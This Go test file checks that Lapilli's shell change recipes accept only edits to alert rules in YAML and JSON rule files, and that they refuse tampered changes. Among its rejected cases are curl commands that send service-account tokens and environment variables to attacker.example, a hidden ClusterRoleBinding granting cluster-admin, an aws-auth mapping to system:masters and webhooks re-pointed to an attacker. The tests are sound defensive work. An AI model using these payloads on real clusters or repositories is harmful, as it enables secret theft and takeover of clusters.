package serve

import (
	"bytes"
	"fmt"
	"math/rand/v2"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"slices"
	"strings"
	"testing"
	"time"

	"go.yaml.in/yaml/v3"

	"lapilli.dev/internal/rules"
)

// What the change recipes read of a file, document by document, with sh,
// awk and jq (recipes/changes/lib.sh), held to what a YAML parser reads:
// a file a change is written to (rule_file), what each document of it is
// (split_docs, doc_read), and what a change may do to it (fits).

// libSays runs script in a shell that has sourced lib.sh, and gives its
// output's lines.
func libSays(t *testing.T, script string) []string {
	t.Helper()
	// From a file, not sh -c: Linux holds one argument to 128 KiB.
	f := filepath.Join(t.TempDir(), "says.sh")
	if err := os.WriteFile(f, []byte(". "+changeRecipes+"lib.sh\n"+script), 0o644); err != nil {
		t.Fatal(err)
	}
	cmd := exec.Command("sh", f)
	cmd.Env = append(os.Environ(), "LAPILLI_URL=http://x", "LAPILLI_TOKEN_FILE="+tokenFile(t, changesToken), "CLONE=x", "RULES_PATHS=alerts")
	out, err := cmd.Output()
	if err != nil {
		t.Fatalf("%v: %s", err, out)
	}
	return strings.Split(strings.TrimSuffix(string(out), "\n"), "\n")
}

type fileCase struct {
	name, body string
	ok         bool
}

// ruleFileSays asks lib.sh's rule_file of each file, in one shell.
func ruleFileSays(t *testing.T, cases []fileCase) []bool {
	t.Helper()
	dir := t.TempDir()
	var script strings.Builder
	for i, c := range cases {
		f := filepath.Join(dir, fmt.Sprint(i))
		os.WriteFile(f, []byte(c.body), 0o644)
		fmt.Fprintf(&script, "if rule_file %q %q; then echo 1; else echo 0; fi\n", f, c.name)
	}
	var says []bool
	for _, l := range libSays(t, script.String()) {
		says = append(says, l == "1")
	}
	if len(says) != len(cases) {
		t.Fatalf("%d answers for %d files", len(says), len(cases))
	}
	return says
}

const (
	promRule = "apiVersion: monitoring.coreos.com/v1\nkind: PrometheusRule\nmetadata:\n  name: shop\n  namespace: monitoring\nspec:\n  groups:\n    - name: shop\n      rules:\n        - alert: Errors\n          expr: errors > 5\n          for: 2m\n"
	rulesCM  = "apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: shop-rules\n  namespace: monitoring\ndata:\n  shop.yaml: |\n    groups:\n      - name: shop\n        rules:\n          - alert: Errors\n            expr: errors > 5\n            for: 2m\n  run.sh: |\n    #!/bin/sh\n    echo checking\n"
	grafana  = "apiVersion: 1\ngroups:\n  - orgId: 1\n    name: shop\n    folder: shop\n    interval: 1m\n    rules:\n      - uid: errors\n        title: Errors\n        for: 2m\ncontactPoints:\n  - orgId: 1\n    name: oncall\n    receivers:\n      - uid: pd\n        type: pagerduty\n"
	monitor  = "apiVersion: monitoring.coreos.com/v1\nkind: ServiceMonitor\nmetadata:\n  name: shop\nspec:\n  selector: {matchLabels: {app: shop}}\n  endpoints: [{port: http}]\n---\n" + promRule
	// What a YAML parser reads, and awk wouldn't see, after a rule file: a
	// document indented as a whole.
	hiddenCRB = "---\n apiVersion: rbac.authorization.k8s.io/v1\n kind: ClusterRoleBinding\n metadata:\n   name: pwn\n roleRef: {apiGroup: rbac.authorization.k8s.io, kind: ClusterRole, name: cluster-admin}\n subjects: [{kind: ServiceAccount, name: default, namespace: attacker}]\n"
)

// ruleFileCases: true, a file a change may be written to, alert rules in
// it (beside other documents or not), each document read here as YAML
// reads it; false, no alert rules, or a document read in more than one way.
var ruleFileCases = []fileCase{
	{"x.yaml", ruleFile, true},
	{"x.yml", "# shop\n---\ngroups:\n- name: shop\n  rules:\n  - alert: A\n    expr: up == 0\n", true},
	{"x.yaml", "groups: []\n", true},
	{"x.rules", "groups:\n  # first\n\n  - name: g\n    rules: []\n...\n", true},
	{"x.yaml", "groups:\r\n  - name: g\r\n    rules: []\r\n", true},
	{"x.yaml", "namespace: shop\ngroups:\n  - name: g\n    rules: []\n", true},
	{"x.yaml", grafana, true},
	{"x.yaml", promRule, true},
	{"x.yaml", monitor, true},
	{"x.yaml", "apiVersion: monitoring.googleapis.com/v1\nkind: 'Rules'  # GMP\nmetadata: {name: shop}\nspec: {groups: []}\n--- # the next\napiVersion: monitoring.coreos.com/v1\nkind: \"PrometheusRule\"\nmetadata: {name: b}\nspec: {groups: []}\n", true},
	{"x.yaml", rulesCM, true},
	{"x.yaml", "apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: rules\nimmutable: false\ndata:\n  shop.yaml: |\n    groups: []\n", true},
	{"x.yaml", "\ufeffgroups: []\n", true},
	{"x.yaml", "groups: []\n---\non: push\njobs: {}\n", true}, // the workflow is left as it is (fits)
	{"x.yaml", `{"groups": [{"name": "shop", "rules": []}]}` + "\n", true},
	{"x.json", `{"groups": [{"name": "g", "rules": []}]}`, true},
	{"X.JSON", `{"apiVersion": "monitoring.coreos.com/v1", "kind": "PrometheusRule", "metadata": {}, "spec": {"groups": []}}`, true},
	{"x.json", "\ufeff" + `{"groups": []}`, true},

	{"x.yaml", "", false},
	{"x.yaml", "# nothing\n", false},
	{"x.yaml", "on: [push]\njobs:\n  check:\n    runs-on: ubuntu-latest\n    steps: [{run: env}]\n", false},
	{"x.yaml", "groups:\n  script: env\n", false},
	{"x.yaml", "groups: 1\n", false},
	{"x.yaml", "groups: []\nsteal:\n  script: env\n", false},
	{"x.yaml", "apiVersion: tekton.dev/v1\nkind: PipelineRun\nmetadata: {}\nspec: {}\n", false},
	{"x.yaml", "apiVersion: monitoring.coreos.com/v1\nkind: PrometheusRule\nmetadata: {}\nspec: {}\njobs: {}\n", false},
	{"x.yaml", "apiVersion: v1\nkind: ConfigMap\nmetadata: {}\n", false},
	// Read in more than one way: refused, rules or not.
	{"x.yaml", promRule + hiddenCRB, false},
	{"x.yaml", "groups: []\n---\n  on: push\n  jobs: {steal: {steps: [{run: env}]}}\n", false},
	{"x.yaml", "  apiVersion: batch/v1\n  kind: Job\n  metadata: {name: pwn}\n---\ngroups: []\n", false},
	{"x.yaml", "groups: []\n---#x: {script: env}\n", false},
	{"x.yaml", "groups: []\n--- {jobs: {steal: {script: env}}}\n", false},
	{"x.yaml", "groups: []\n--- !!map\njobs: {}\n", false},
	{"x.yaml", "{groups: [], jobs: {steal: {script: env}}}\n", false},
	{"x.yaml", "groups: []\n\"jobs\": {steal: {script: env}}\n", false},
	{"x.yaml", "groups: []\n? jobs\n: {steal: {script: env}}\n", false},
	{"x.yaml", "groups: []\n<<: {jobs: {steal: {script: env}}}\n", false},
	{"x.yaml", "groups: &g []\n", false},
	{"x.yaml", "groups: !!seq []\n", false},
	{"x.yaml", "%YAML 1.1\n---\ngroups: []\n", false},
	{"x.yaml", "- groups: []\n", false},
	{"x.yaml", "groups: []\ngroups: []\n", false},
	{"x.yaml", "groups: []\nnamespace: \"a\nb: c\"\n", false},
	{"x.yaml", "groups: []\nnamespace: [a,\nb]\n", false},
	{"x.yaml", "groups: []\rjobs: {steal: {script: env}}\n", false},
	{"x.yaml", "groups: []\u0085jobs: {steal: {script: env}}\n", false},
	{"x.yaml", "groups: []\u2028jobs: {steal: {script: env}}\n", false},
	{"x.yaml", "groups: []\u2029jobs: {steal: {script: env}}\n", false},
	{"x.yaml", "groups: []\x00\njobs: {}\n", false},
	{"x.yaml", "\tjobs: {}\ngroups: []\n", false},
	{"x.yaml", "apiVersion: v1\nkind: ConfigMap\nmetadata:\n  \"name\": rules\ndata:\n  shop.yaml: |\n    groups: []\n", false},
	{"x.json", `{"groups": [], "jobs": {}}`, false},
	{"x.json", `{"groups": {}}`, false},
	{"x.json", `[{"groups": []}]`, false},
	{"x.json", `{"groups": []} {"jobs": {}}`, false},
	{"x.json", `{"kind": "Secret", "kind": "ConfigMap", "apiVersion": "v1", "metadata": {"name": "x"}, "data": {}}`, false},
}

// Files Lapilli reads its rules from, as they are written: rule_file
// takes each, or a change Lapilli proposes to one could never be written.
// Those of this repository too: every file it reads alert rules from and
// can change a rule in (rules.EditDoc; a cloud's own formats it can't).
func TestRuleFile(t *testing.T) {
	needTools(t)
	cases := slices.Clone(ruleFileCases)
	cases = append(cases, fileCase{"x.yaml", `---
# Source: kube-prometheus-stack/templates/prometheus/rules-1.14/alertmanager.rules.yaml
apiVersion: monitoring.coreos.com/v1
kind: PrometheusRule
metadata:
  name: kps-alertmanager.rules
  namespace: monitoring
  labels:
    app: kube-prometheus-stack
    release: "kps"
spec:
  groups:
  - name: alertmanager.rules
    rules:
    - alert: AlertmanagerFailedReload
      expr: |-
        # Without max_over_time, failed scrapes could create false negatives.
        max_over_time(alertmanager_config_last_reload_successful{job="kps-alertmanager"}[5m]) == 0
      for: 10m
`, true})
	var names []string
	for range cases {
		names = append(names, "")
	}
	root := filepath.Join("..", "..")
	filepath.Walk(root, func(p string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.IsDir() {
			if n := info.Name(); n == ".git" || n == "charts" || n == "site" {
				return filepath.SkipDir
			}
			return nil
		}
		ext := strings.ToLower(filepath.Ext(p))
		if ext != ".yml" && ext != ".yaml" && ext != ".json" && ext != ".rules" {
			return nil
		}
		b, _ := os.ReadFile(p)
		rs, err := rules.Parse(b)
		if err != nil || len(rs) == 0 {
			return nil
		}
		d := 17 * time.Minute
		if _, err := rules.EditDoc(b, rules.Edit{Name: rs[0].Name, Group: rs[0].Group, UID: rs[0].UID, For: &d}); err != nil {
			return nil
		}
		cases = append(cases, fileCase{filepath.Base(p), string(b), true})
		names = append(names, p)
		return nil
	})
	says := ruleFileSays(t, cases)
	for i, c := range cases {
		if says[i] != c.ok {
			t.Errorf("%s %s %q: rule_file says %v", names[i], c.name, c.body[:min(len(c.body), 200)], says[i])
		}
	}
	if n := len(names) - len(ruleFileCases) - 1; n < 10 {
		t.Errorf("only %d of the repository's files read: the walk found too few", n)
	} else {
		t.Logf("%d of the repository's files of rules, each taken", n)
	}
}

// docKeys are the keys at the top of each document of body, as yaml.v3
// reads it: nil for an empty document, and an error for a document whose
// top is no mapping.
func docKeys(body string) ([][]string, error) {
	dec := yaml.NewDecoder(strings.NewReader(body))
	var out [][]string
	for {
		var n yaml.Node
		if err := dec.Decode(&n); err != nil {
			if err.Error() == "EOF" {
				return out, nil
			}
			return nil, err
		}
		if len(n.Content) == 0 || n.Content[0].Kind == yaml.ScalarNode && n.Content[0].Tag == "!!null" {
			out = append(out, nil)
			continue
		}
		top := n.Content[0]
		if top.Kind != yaml.MappingNode {
			return nil, fmt.Errorf("a document whose top is no mapping")
		}
		ks := []string{}
		for i := 0; i < len(top.Content); i += 2 {
			if top.Content[i].Kind != yaml.ScalarNode {
				return nil, fmt.Errorf("a key that is no text")
			}
			ks = append(ks, top.Content[i].Value)
		}
		out = append(out, ks)
	}
}

// docsSay gives, for each file, what split_docs and doc_read say of each
// of its documents, in one shell.
func docsSay(t *testing.T, bodies []string) [][]string {
	t.Helper()
	dir := t.TempDir()
	var script strings.Builder
	for i, b := range bodies {
		f := filepath.Join(dir, fmt.Sprint(i))
		os.WriteFile(f, []byte(b), 0o644)
		fmt.Fprintf(&script, `if plain_text %[1]q; then n=$(split_docs %[1]q %[1]q.d); j=0; while [ "$j" -lt "$n" ]; do printf '%%s|' "$(doc_read %[1]q.d/$j)"; j=$((j + 1)); done; echo; else echo text; fi
`, f)
	}
	var out [][]string
	for _, l := range libSays(t, script.String()) {
		out = append(out, strings.Split(strings.TrimSuffix(l, "|"), "|"))
	}
	if len(out) != len(bodies) {
		t.Fatalf("%d answers for %d files", len(out), len(bodies))
	}
	return out
}

// randomDocs are files made at random from pieces of rule files, of CI
// systems' and Kubernetes' files, document markers of every kind and
// documents indented as a whole.
func randomDocs(seed uint64, n int) []string {
	pieces := []string{"groups:\n", "groups: []\n", "  - name: g\n", "- name: g\n", "    rules: []\n", "jobs:\n", "  steal: {script: env}\n",
		"steps: [{run: env}]\n", "---\n", "--- \n", "---\t\n", "--- # c\n", "---#x\n", "---#x: 1\n", "--- jobs: {}\n", "...\n", "... # c\n",
		"# c\n", "\n", "apiVersion: 1\n", "kind: PrometheusRule\n", "kind: ConfigMap\n", "spec: {}\n", "data: {}\n", "metadata: {}\n",
		"metadata:\n", "  name: x\n", "  namespace: y\n", "\"jobs\": {}\n", "  script: env\n", "groups: [\n", "]\n", "script: env\n",
		" apiVersion: v1\n", "  kind: Job\n", " jobs: {}\n", "   - x\n", "templates:\n", "policies: x\n", "? jobs\n", ": {}\n",
		"<<: {jobs: {}}\n", "groups: &a []\n", "x: *a\n", "%YAML 1.1\n", "--- |\n", "namespace: n\n", "groups: |\n", "  jobs: {}\n",
		"data:\n", "  a.yaml: |\n", "    groups: []\n", "kind: \"Rules\"\n", "name: 'x'\n", "x: \"a\n", "b\"\n"}
	r := rand.New(rand.NewPCG(seed, seed+1))
	var out []string
	for range n {
		var b bytes.Buffer
		for range 1 + r.IntN(10) {
			b.WriteString(pieces[r.IntN(len(pieces))])
		}
		out = append(out, b.String())
	}
	// And files of documents YAML reads, each of entries at its top, some
	// indented as a whole, between markers of every kind.
	entries := []string{"groups:\n  - name: g\n    rules: []\n", "groups:\n- name: g\n", "groups: []\n", "kind: PrometheusRule\n",
		"kind: ConfigMap\n", "apiVersion: v1\n", "metadata:\n  name: x\n  labels: {a: b}\n", "metadata: {name: x}\n", "spec: {groups: []}\n",
		"spec:\n  groups: []\n", "jobs:\n  steal: {script: env}\n", "on: push\n", "data:\n  a.yaml: |\n    groups: []\n",
		"namespace: n\n", "roleRef: {kind: ClusterRole, name: cluster-admin}\n", "# c\n"}
	markers := []string{"---\n", "--- \n", "---\t\n", "--- # c\n", "...\n---\n", "... # c\n", "---\n...\n"}
	for range n {
		var b bytes.Buffer
		for d := range 1 + r.IntN(3) {
			if d > 0 || r.IntN(3) == 0 {
				b.WriteString(markers[r.IntN(len(markers))])
			}
			indent := ""
			if r.IntN(4) == 0 {
				indent = strings.Repeat(" ", 1+r.IntN(2))
			}
			seen := map[int]bool{}
			for range 1 + r.IntN(4) {
				e := r.IntN(len(entries))
				if seen[e] {
					continue
				}
				seen[e] = true
				for _, l := range strings.SplitAfter(entries[e], "\n") {
					if l != "" {
						b.WriteString(indent + l)
					}
				}
			}
		}
		out = append(out, b.String())
	}
	return out
}

// What doc_read sees of each document is what YAML reads: as many
// documents holding keys, and the same keys at the top of each, wherever
// YAML reads the file at all. Files made at random, and those above, are
// held to it.
func TestDocsAsYAMLReads(t *testing.T) {
	needTools(t)
	bodies := randomDocs(21, 300)
	for _, c := range ruleFileCases {
		if !strings.HasSuffix(strings.ToLower(c.name), ".json") {
			bodies = append(bodies, c.body)
		}
	}
	read := 0
	for i, says := range docsSay(t, bodies) {
		if slices.Contains(says, "text") || slices.ContainsFunc(says, func(s string) bool { return s == "bad" }) {
			continue
		}
		yamls, err := docKeys(strings.TrimPrefix(bodies[i], "\ufeff"))
		if err != nil {
			continue // nothing reads it
		}
		read++
		var ours [][]string
		for _, s := range says {
			f := strings.Fields(s)
			if f[0] == "empty" {
				ours = append(ours, nil)
				continue
			}
			ours = append(ours, f[1:])
		}
		// Empty documents hold no keys, and yaml.v3 counts them as it likes
		// (none before a first ---): those that hold keys are held to it.
		trim := func(d [][]string) [][]string {
			return slices.DeleteFunc(slices.Clone(d), func(k []string) bool { return k == nil })
		}
		if !slices.EqualFunc(trim(ours), trim(yamls), slices.Equal) {
			t.Errorf("%q: read here as %v, by YAML as %v", bodies[i], ours, yamls)
		}
	}
	t.Logf("%d of %d files read here, each as YAML reads it", read, len(bodies))
}

// stack is test/e2e/stack.yaml, a ConfigMap of rules beside the
// Deployments, Services, a Secret and a ConfigMap holding a script.
func stack(t *testing.T) string {
	t.Helper()
	b, err := os.ReadFile("../../test/e2e/stack.yaml")
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// fitsSays asks lib.sh's fits of each pair, the old file as named.
func fitsSays(t *testing.T, pairs [][3]string) []bool {
	t.Helper()
	dir := t.TempDir()
	var script strings.Builder
	for i, p := range pairs {
		o, n := filepath.Join(dir, fmt.Sprint(i, ".old")), filepath.Join(dir, fmt.Sprint(i, ".new"))
		os.WriteFile(o, []byte(p[0]), 0o644)
		os.WriteFile(n, []byte(p[1]), 0o644)
		fmt.Fprintf(&script, "if fits %q %q %q; then echo 1; else echo 0; fi\n", o, n, p[2])
	}
	var says []bool
	for _, l := range libSays(t, script.String()) {
		says = append(says, l == "1")
	}
	if len(says) != len(pairs) {
		t.Fatalf("%d answers for %d pairs", len(says), len(pairs))
	}
	return says
}

// A change writes a file of rules over the one it was made against, and
// changes only its rules: each document as it was, byte for byte, or, one
// of rules in both, the same but for its rules. A Lapilli someone took over
// rewrote a ConfigMap of rules as EKS's aws-auth, added contact points
// and notification policies to a Grafana file, or a ClusterRoleBinding
// after a PrometheusRule: each took, as it was alert rules in shape.
func TestFits(t *testing.T) {
	needTools(t)
	st := stack(t)
	longer := func(s string) string { return strings.Replace(s, "for: 2m", "for: 15m", 1) }
	for _, c := range []struct {
		name     string
		old, new string
		file     string
		ok       bool
	}{
		{"a rule file's for", ruleFile, strings.Replace(ruleFile, "for: 2m", "for: 15m", 1), "x.yaml", true},
		{"a PrometheusRule's for", promRule, longer(promRule), "x.yaml", true},
		{"beside a ServiceMonitor", monitor, longer(monitor), "x.yaml", true},
		{"a ConfigMap's rules", rulesCM, longer(rulesCM), "x.yaml", true},
		{"a Grafana file's rule", grafana, longer(grafana), "x.yaml", true},
		{"a byte order mark, kept", "\ufeff" + ruleFile, "\ufeff" + longer(ruleFile), "x.yml", true},
		{"a byte order mark, dropped", "\ufeff" + ruleFile, longer(ruleFile), "x.yml", true},
		{"test/e2e/stack.yaml's rules", st, strings.Replace(st, "expr: up == 2", "expr: up == 3", 1), "stack.yaml", true},
		{"a ConfigMap, immutable", strings.Replace(rulesCM, "\ndata:", "\nimmutable: false\ndata:", 1), longer(strings.Replace(rulesCM, "\ndata:", "\nimmutable: false\ndata:", 1)), "x.yaml", true},
		{"JSON", `{"groups": [{"name": "g", "rules": [{"alert": "A", "expr": "a", "for": "2m"}]}]}`, `{"groups": [{"name": "g", "rules": [{"alert": "A", "expr": "a", "for": "15m"}]}]}`, "x.json", true},
		{"as it was", promRule, promRule, "x.yaml", true},

		{"a ClusterRoleBinding added, indented", promRule, longer(promRule) + hiddenCRB, "x.yaml", false},
		{"a ClusterRoleBinding added", promRule, longer(promRule) + "---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata: {name: pwn}\n", "x.yaml", false},
		{"a document taken away", monitor, longer(promRule), "x.yaml", false},
		{"rules as EKS's aws-auth", rulesCM, "apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: aws-auth\n  namespace: kube-system\ndata:\n  mapRoles: |\n    - rolearn: arn:aws:iam::111122223333:role/attacker\n      groups: [system:masters]\n", "x.yaml", false},
		{"a ConfigMap's namespace", rulesCM, strings.Replace(longer(rulesCM), "namespace: monitoring", "namespace: kube-system", 1), "x.yaml", false},
		{"a ConfigMap's script", rulesCM, strings.Replace(rulesCM, "echo checking", "curl -d @/var/run/secrets/token https://attacker.example", 1), "x.yaml", false},
		{"stack.yaml's script", st, strings.Replace(st, "print(\"POST\"", "import os; print(os.environ); print(\"POST\"", 1), "stack.yaml", false},
		{"stack.yaml's Deployment", st, strings.Replace(st, "--storage.tsdb.path=/prometheus", "--web.enable-admin-api", 1), "stack.yaml", false},
		{"a ConfigMap entry added", rulesCM, rulesCM + "  more.yaml: |\n    groups: []\n", "x.yaml", false},
		{"a ConfigMap's rules, made a workflow", rulesCM, strings.Replace(rulesCM, "    groups:\n      - name: shop", "    on: push\n    jobs: {}\n    groups:\n      - name: shop", 1), "x.yaml", false},
		{"a PrometheusRule's labels", promRule, strings.Replace(longer(promRule), "  namespace: monitoring\n", "  namespace: monitoring\n  labels: {argocd.argoproj.io/hook: PreSync}\n", 1), "x.yaml", false},
		{"a PrometheusRule's kind", promRule, strings.Replace(promRule, "kind: PrometheusRule", "kind: ClusterRoleBinding", 1), "x.yaml", false},
		{"Grafana's contact points re-pointed", grafana, strings.Replace(longer(grafana), "type: pagerduty", "type: webhook\n        settings: {url: \"https://attacker.example/hook\"}", 1), "x.yaml", false},
		{"Grafana's policies added", "apiVersion: 1\ngroups: []\n", "apiVersion: 1\ngroups: []\ncontactPoints:\n  - orgId: 1\n    name: all\n    receivers: [{uid: x, type: webhook, settings: {url: \"https://attacker.example/hook\"}}]\npolicies:\n  - orgId: 1\n    receiver: all\nresetPolicies: [1]\n", "x.yaml", false},
		{"a workflow beside rules, rewritten", "groups: []\n---\non: push\njobs: {}\n", "groups: []\n---\non: push\njobs: {steal: {steps: [{run: env}]}}\n", "x.yaml", false},
		{"a rule file made a GitLab job", ruleFile, "groups:\n  script: env\n", "x.yaml", false},
		{"---# after the rules", ruleFile, longer(ruleFile) + "---#x: {script: env}\n", "x.yaml", false},
		{"a NEL", ruleFile, longer(ruleFile) + "x: 1\u0085jobs: {}\n", "x.yaml", false},
		{"JSON's other keys", `{"groups": [], "namespace": "a"}`, `{"groups": [], "namespace": "b"}`, "x.json", false},
		{"JSON, a key twice", `{"groups": []}`, `{"groups": [], "groups": [{"name": "x"}]}`, "x.json", false},
	} {
		if got := fitsSays(t, [][3]string{{c.old, c.new, c.file}})[0]; got != c.ok {
			t.Errorf("%s: fits says %v", c.name, got)
		}
	}
}

// Whatever fits takes, YAML reads as the file it was, but for its rules:
// files of rules changed at random, a line put in, taken out or changed,
// a document added, are held to it.
func TestFitsAsYAMLReads(t *testing.T) {
	needTools(t)
	bases := []string{ruleFile, promRule, monitor, rulesCM, grafana, stack(t), "groups: []\n---\non: push\njobs: {}\n"}
	pieces := []string{"jobs: {}\n", "  jobs: {}\n", "    - alert: X\n      expr: x\n", "---\n", "--- # c\n", "---#x: 1\n", " kind: Job\n",
		"  name: aws-auth\n", "  namespace: kube-system\n", "contactPoints: []\n", "      for: 9m\n", "# c\n", "\n", "    groups: []\n",
		"  run.sh: |\n", "    echo hi\n", "spec: {}\n", "data:\n", "  x: |\n", "...\n", "metadata: {name: x}\n", "  labels: {a: b}\n"}
	r := rand.New(rand.NewPCG(31, 32))
	var pairs [][3]string
	for range 400 {
		old := bases[r.IntN(len(bases))]
		lines := strings.SplitAfter(old, "\n")
		for range 1 + r.IntN(3) {
			at := r.IntN(len(lines) + 1)
			switch r.IntN(3) {
			case 0:
				lines = slices.Insert(lines, at, pieces[r.IntN(len(pieces))])
			case 1:
				if at < len(lines) {
					lines = slices.Delete(lines, at, at+1)
				}
			default:
				if at < len(lines) {
					lines[at] = strings.Replace(lines[at], "2m", "15m", 1)
				}
			}
		}
		pairs = append(pairs, [3]string{old, strings.Join(lines, ""), "x.yaml"})
	}
	took := 0
	for i, ok := range fitsSays(t, pairs) {
		if !ok || pairs[i][0] == pairs[i][1] {
			continue
		}
		took++
		was, err1 := docValues(pairs[i][0])
		is, err2 := docValues(pairs[i][1])
		if err1 != nil {
			t.Fatalf("%q: %v", pairs[i][0], err1)
		}
		if err2 != nil {
			continue // nothing reads it
		}
		if len(was) != len(is) {
			t.Errorf("fits took %q over %q: %d documents, were %d", pairs[i][1], pairs[i][0], len(is), len(was))
			continue
		}
		for j := range was {
			if reflect.DeepEqual(was[j], is[j]) {
				continue
			}
			a, _ := was[j].(map[string]any)
			b, _ := is[j].(map[string]any)
			rulesKey := "groups"
			switch a["kind"] {
			case "PrometheusRule", "Rules", "ClusterRules", "GlobalRules":
				rulesKey = "spec"
			case "ConfigMap":
				rulesKey = "data"
			}
			for k := range mergeKeys(a, b) {
				if k != rulesKey && !reflect.DeepEqual(a[k], b[k]) {
					t.Errorf("fits took %q over %q: %q changed", pairs[i][1], pairs[i][0], k)
				}
			}
			if rulesKey == "data" {
				da, _ := a["data"].(map[string]any)
				db, _ := b["data"].(map[string]any)
				for k := range mergeKeys(da, db) {
					if reflect.DeepEqual(da[k], db[k]) {
						continue
					}
					s, _ := db[k].(string)
					keys, err := docKeys(s)
					if err != nil {
						continue // nothing reads it, a rule file no more
					}
					for _, ks := range keys {
						if ks != nil && (!slices.Contains(ks, "groups") || slices.ContainsFunc(ks, func(k string) bool { return !slices.Contains(ruleFileKeys, k) })) {
							t.Errorf("fits took %q over %q: data %q, %q, is no rule file", pairs[i][1], pairs[i][0], k, s)
						}
					}
				}
			}
		}
	}
	t.Logf("%d of %d changes made at random taken", took, len(pairs))
}

// ruleFileKeys are the keys at the top of a rule file.
var ruleFileKeys = []string{"groups", "namespace", "apiVersion", "deleteRules", "contactPoints", "deleteContactPoints", "policies",
	"resetPolicies", "templates", "deleteTemplates", "muteTimes", "deleteMuteTimes"}

// docValues are the documents of body, as yaml.v3 reads them.
func docValues(body string) ([]any, error) {
	dec := yaml.NewDecoder(strings.NewReader(strings.TrimPrefix(body, "\ufeff")))
	var out []any
	for {
		var v any
		if err := dec.Decode(&v); err != nil {
			if err.Error() == "EOF" {
				return out, nil
			}
			return nil, err
		}
		out = append(out, v)
	}
}

func mergeKeys(a, b map[string]any) map[string]bool {
	out := map[string]bool{}
	for k := range a {
		out[k] = true
	}
	for k := range b {
		out[k] = true
	}
	return out
}

// End to end: a Lapilli someone took over hands out, for a PrometheusRule
// under RULES_PATHS, the PrometheusRule and a ClusterRoleBinding indented
// after it; for a ConfigMap of rules, EKS's aws-auth, or its script
// changed; for a Grafana file, its contact point re-pointed. Each was
// pushed and a pull request opened, as Lapilli's change to a rule, for a
// GitOps controller to apply once merged. Now none is; a rule changed,
// beside a ServiceMonitor or in a ConfigMap, still is.
func TestChangeRecipeChangesOnlyRules(t *testing.T) {
	needTools(t)
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	longer := func(s string) string { return strings.Replace(s, "for: 2m", "for: 15m", 1) }
	files := map[string]string{"alerts/shop.yaml": promRule, "alerts/cm.yaml": rulesCM, "alerts/both.yaml": monitor, "alerts/grafana.yaml": grafana}
	for _, c := range []struct {
		name, target, document string
		opened                 bool
	}{
		{"a ClusterRoleBinding indented after the rules", "alerts/shop.yaml", longer(promRule) + hiddenCRB, false},
		{"EKS's aws-auth for a ConfigMap of rules", "alerts/cm.yaml", "apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: aws-auth\n  namespace: kube-system\ndata:\n  mapRoles: |\n    - rolearn: arn:aws:iam::111122223333:role/attacker\n      username: attacker\n      groups: [system:masters]\n", false},
		{"a ConfigMap's script", "alerts/cm.yaml", strings.Replace(longer(rulesCM), "echo checking", "env | curl -d @- https://attacker.example", 1), false},
		{"Grafana's contact point re-pointed", "alerts/grafana.yaml", strings.Replace(grafana, "type: pagerduty", "type: webhook\n        settings: {url: \"https://attacker.example/hook\"}", 1), false},
		{"a rule beside a ServiceMonitor", "alerts/both.yaml", longer(monitor), true},
		{"a rule in a ConfigMap", "alerts/cm.yaml", longer(rulesCM), true},
	} {
		t.Run(c.name, func(t *testing.T) {
			env := gitEnv(t)
			bare := repo(t, env, files, nil, nil)
			lapilli := newStandIn(t, []map[string]any{{"id": 1, "ledger": "0123456789ab", "rule": "Errors", "kind": "for", "state": "ready",
				"doc_hash": sum(files[c.target]), "document": c.document, "title": "Lapilli: a new for, Errors", "body": "Backtest"}})
			host, hostURL := githubStandIn(t)
			out, _ := runChangeRecipe(t, env, lapilli.URL, hostURL, bare, "alerts")
			pushed := branches(t, env, bare)
			if c.opened {
				if len(pushed) != 1 || len(host.opened) != 1 {
					t.Errorf("pushed %v, opened %v: %s %s", pushed, host.opened, out, lapilli.said())
				}
				return
			}
			if len(pushed) != 0 || len(host.opened) != 0 || !strings.Contains(lapilli.said(), "changes more than the alert rules") {
				t.Errorf("pushed %v, opened %v: %s %s", pushed, host.opened, out, lapilli.said())
			}
		})
	}
}
